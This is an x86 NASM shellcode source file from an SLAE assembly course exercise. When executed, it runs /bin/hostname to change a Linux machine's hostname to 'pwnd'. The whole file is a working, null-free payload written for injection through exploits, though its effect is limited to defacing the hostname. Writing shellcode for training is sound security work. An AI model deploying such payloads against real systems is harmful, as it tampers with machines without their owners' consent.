; Filename: pwnd.nasm
; Author  : Hashim Jawad 
; Website : ihack4falafel.com
; Twitter : @ihack4falafel 
; SLAE ID : SLAE -1115
; Purpose : change hostname to pwnd! 

global _start			

section .text

_start:

	; push NULL into stack
	xor eax, eax
	push eax

	; push (////bin/hostname) into stack
	push 0x656d616e
	push 0x74736f68
	push 0x2f6e6962
	push 0x2f2f2f2f

	; store ESP pointer in EBX
	mov ebx, esp

	; push NULL into stack and EDX
	push eax
	mov edx, eax

	; push (pwnd) into stack followed by NULL
	push 0x646e7770

	; store ESP pointer in EDI
	mov edi, esp

	; push EBX, EDI, EAX into stack
	push eax
	push edi
	push ebx

	; store ESP pointer in ECX
	mov ecx, esp

	; execute exeve syscall
	mov al, 0xb
	int 0x80
